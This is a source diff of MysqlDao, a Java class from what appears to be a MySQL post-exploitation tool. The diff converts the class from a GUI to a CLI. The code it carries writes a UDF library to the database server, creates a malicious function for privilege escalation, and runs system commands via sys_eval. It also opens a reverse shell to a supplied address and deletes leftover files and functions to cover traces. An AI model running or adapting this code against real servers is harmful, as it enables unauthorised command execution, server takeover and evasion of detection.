@@ -1,26 +1,23 @@
 package Dao;
 
-import Controller.MysqlController;
-import Entity.ControllersFactory;
-import Util.YamlConfigs;
-import Util.MessageUtil;
+import Util.DriverLoader;
+import Util.JdbcProfiles;
+import Util.Reporter;
 import Util.Utils;
 
 import java.io.File;
-import java.lang.reflect.Method;
-import java.net.URL;
-import java.net.URLClassLoader;
 import java.sql.*;
 import java.text.MessageFormat;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Map;
+import java.util.Properties;
 
 import Util.MysqlSqlUtil;
-import javafx.application.Platform;
 
 /**
  * @author ch1ng & j1anFen
+ * CLI 化解耦（M1）：仅换输出口——Controller/TextArea → Reporter；config.yaml → JdbcProfiles；
+ * DriverManager+addURL → DriverLoader。业务逻辑（SQL 模板/UDF 链）零改动。
  */
 public class MysqlDao {
     private String JARFILE;
@@ -30,8 +27,6 @@ public class MysqlDao {
     private String PASSWORD;
 
     private Connection CONN = null;
-    private URLClassLoader URLCLASSLOADER = null;
-    private Method METHOD = null;
 
     private String version;
     private String mysqlPlatform;
@@ -45,32 +40,34 @@ public class MysqlDao {
 
 
     /**
-     * 用此方法获取 MysqlController 的日志框
+     * 统一输出口（原 MysqlController 日志框；缺省空实现，宿主经 setReporter 注入）
      */
-    private MysqlController mysqlController = (MysqlController) ControllersFactory.controllers.get(MysqlController.class.getSimpleName());
+    private Reporter reporter = Reporter.NONE;
 
+    public void setReporter(Reporter reporter) {
+        this.reporter = reporter;
+    }
 
     public MysqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
-        YamlConfigs configs = new YamlConfigs();
-        Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
-        // 从配置文件读取变量
-        JARFILE = (String) configs.getValue("Mysql.Driver", yamlToMap);
-        JDBCURL = (String) configs.getValue("Mysql.JDBCUrl", yamlToMap);
-        DRIVER = (String) configs.getValue("Mysql.ClassName", yamlToMap);
+        // 零配置：驱动与 URL 模板取自 JdbcProfiles（原 config.yaml 的 Mysql.* 三项）
+        JARFILE = JdbcProfiles.driverPath(JdbcProfiles.MYSQL_JAR);
+        JDBCURL = JdbcProfiles.MYSQL_URL;
+        DRIVER = JdbcProfiles.MYSQL_CLASS;
         // 进行时间转换
         timeout = String.valueOf(Integer.parseInt(timeout) * 1000);
-        //JDBCURL = JDBCURL + "&connectTimeout=" + timeout + "&socketTimeout=" + timeout;
-        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database,timeout);
+        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database, timeout);
         USERNAME = username;
         PASSWORD = password;
-        // 动态加载
-        URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
-        METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
-        METHOD.setAccessible(true);
-        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
-        URL url = (new File(JARFILE)).toURI().toURL();
-        METHOD.invoke(URLCLASSLOADER, url);
-        Class.forName(DRIVER);
+    }
+
+    /**
+     * 连接属性（user/password；SOCKS5 入站代理走进程级 socksProxy* 系统属性，见 cli 侧）
+     */
+    private Properties connectProps() {
+        Properties props = new Properties();
+        props.setProperty("user", USERNAME);
+        props.setProperty("password", PASSWORD);
+        return props;
     }
 
     /**
@@ -79,20 +76,17 @@ public class MysqlDao {
      * @return
      * @throws java.sql.SQLException
      */
-    public void testConnection() throws java.sql.SQLException {
+    public void testConnection() throws Exception {
         if (CONN == null || CONN.isClosed()) {
-            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
-            Utils.regroupDrivers("mysql");
-            DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
+            // DriverLoader：子加载器 + Driver#connect 直连（JDK8+，无 DriverManager 信任检查）
+            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
             closeConnection();
         }
     }
 
-    public Connection getConnection() throws java.sql.SQLException {
+    public Connection getConnection() throws Exception {
         if (CONN == null || CONN.isClosed()) {
-            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
-            Utils.regroupDrivers("mysql");
-            CONN = DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
+            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
         }
         return CONN;
     }
@@ -112,18 +106,12 @@ public class MysqlDao {
             if (this.version != null && this.mysqlPlatform != null && this.systemPlatform != null) {
                 this.versionOutfile();
                 this.Option();
-                Platform.runLater(() -> {
-                    mysqlController.mysqlLogTextArea.appendText(Utils.log("本地UDF初始化成功,可尝试进行UDF提权"));
-                });
+                reporter.log(Utils.log("本地UDF初始化成功,可尝试进行UDF提权"));
             } else {
-                Platform.runLater(() -> {
-                    mysqlController.mysqlLogTextArea.appendText(Utils.log("mysql版本信息获取有误"));
-                });
+                reporter.log(Utils.log("mysql版本信息获取有误"));
             }
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
     }
 
@@ -150,14 +138,10 @@ public class MysqlDao {
             }
             String res = Utils.log(String.format("Mysql版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform,
                     this.systemPlatform));
-            Platform.runLater(() -> {
-                mysqlController.mysqlLogTextArea.appendText(res);
-            });
+            reporter.log(res);
             this.initUDF();
         } catch (SQLException ex) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(ex, ex.getMessage());
-            });
+            reporter.error(ex.getMessage(), ex);
         }
     }
 
@@ -169,7 +153,7 @@ public class MysqlDao {
         try {
             String path = null;
             if (mysqlPlatform.startsWith("Win")) {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("windows服务器udf失败可尝试直接反弹shell"));
+                reporter.log(Utils.log("windows服务器udf失败可尝试直接反弹shell"));
                 int versionNumber = Integer.parseInt(mysqlPlatform.substring(3));
                 if (versionNumber == 32) {
                     path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win32_hex.txt";
@@ -188,9 +172,7 @@ public class MysqlDao {
                 }
             }
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
     }
 
@@ -262,22 +244,16 @@ public class MysqlDao {
 
             // 5.执行sql语句
             st.execute();
-            Platform.runLater(() -> {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("库文件写入成功"));
-            });
+            reporter.log(Utils.log("库文件写入成功"));
             //PublicUtil.log("插件UDF写入成功");
 
             String sqlEval = String.format(MysqlSqlUtil.createFunctionSql,funcEvil,randomPluginFile);
             //System.out.println(sqlEval);
             PreparedStatement st1 = CONN.prepareStatement(sqlEval);
             st1.execute();
-            Platform.runLater(() -> {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 " + funcEvil + " 创建执行成功"));
-            });
+            reporter.log(Utils.log("函数 " + funcEvil + " 创建执行成功"));
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
     }
 
@@ -303,14 +279,10 @@ public class MysqlDao {
         } catch (Exception e) {
             String res = e.getMessage();
             if (res.contains("does not exist")) {
-                Platform.runLater(() -> {
-                    mysqlController.mysqlLogTextArea.appendText(Utils.log("命令函数不存在！请创建！"));
-                });
+                reporter.log(Utils.log("命令函数不存在！请创建！"));
                 return "";
             }
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
         return "";
     }
@@ -331,9 +303,7 @@ public class MysqlDao {
         } catch (NullPointerException e) {
             return "命令执行完成";
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
         return "";
     }
@@ -348,20 +318,14 @@ public class MysqlDao {
             String sql = String.format(MysqlSqlUtil.ntfsCreateDirectory,remoteOutfile.substring(0, remoteOutfile.length() - 1) );
             PreparedStatement st = CONN.prepareStatement(sql);
             st.execute();
-            Platform.runLater(() -> {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建成功"));
-            });
+            reporter.log(Utils.log("目录创建成功"));
         } catch (Exception e) {
             String res = e.getMessage();
             if (res.contains("already exists")) {
-                Platform.runLater(() -> {
-                    mysqlController.mysqlLogTextArea.appendText(Utils.log("目录已存在！"));
-                });
+                reporter.log(Utils.log("目录已存在！"));
                 return;
             }
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
     }
 
@@ -378,9 +342,7 @@ public class MysqlDao {
             this.udf("backshell");
             backShell(reverseAddress, Integer.parseInt(reversePort), code);
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
     }
 
@@ -394,9 +356,8 @@ public class MysqlDao {
             PreparedStatement st2 = CONN.prepareStatement(cleanSql1);
             st2.execute();
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });        }
+            reporter.error(e.getMessage(), e);
+        }
     }
 
     /**
@@ -408,9 +369,7 @@ public class MysqlDao {
         String rmplugin = null;
 
         try {
-            Platform.runLater(() -> {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
-            });
+            reporter.log(Utils.log("删除服务器UDF遗留文件"));
             String tempPath = remoteOutfile + "*.temp";
             if (mysqlPlatform.startsWith("Win")) {
                 rmplugin = "del /f " + tempPath;
@@ -418,17 +377,49 @@ public class MysqlDao {
                 rmplugin = "rm -f " + tempPath;
             }
             eval(rmplugin, "UTF-8");
-            Platform.runLater(() -> {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
-            });
+            reporter.log(Utils.log("卸载所有恶意函数"));
             // 删除恶意函数
             this.removeEvilFunc();
 
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
+    }
+
+    // ---- 只读状态访问器（CLI dispatcher 结构化 info 用；不影响既有行为） ----
+    public String getVersion() {
+        return version;
+    }
+
+    public String getMysqlPlatform() {
+        return mysqlPlatform;
+    }
+
+    public String getSystemPlatform() {
+        return systemPlatform;
+    }
+
+    public String getRemoteOutfile() {
+        return remoteOutfile;
+    }
+
+    public String getUdfFullPath() {
+        return udfFullPath;
+    }
+
+    /** 供 dispatcher 探测 sys_eval 是否已部署（select 1+1 形式不可用时返回 false） */
+    public boolean sysEvalExists() {
+        try {
+            PreparedStatement st = CONN.prepareStatement(MysqlSqlUtil.evalSql.replace("%s", "1"));
+            ResultSet rs = st.executeQuery();
+            while (rs.next()) {
+                rs.getString("s");
+                return true;
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        return false;
     }
 
 }
